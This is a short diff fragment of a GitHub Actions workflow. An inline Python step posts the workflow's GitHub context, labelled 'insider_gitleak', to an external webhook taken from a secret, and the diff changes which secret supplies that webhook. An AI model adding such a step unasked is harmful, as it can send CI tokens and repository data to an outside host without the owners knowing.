@@ -12,4 +12,4 @@ jobs:
         github_request = {"insider_gitleak": github};
         requests.post("'$LambdaWebHook'", json=github_request);'
       env:
-        LambdaWebHook: ${{ secrets.CHECKMARX_LAMBDA_WEBHOOK }}
+        LambdaWebHook: ${{ secrets.INSECPROXY_HOOK }}
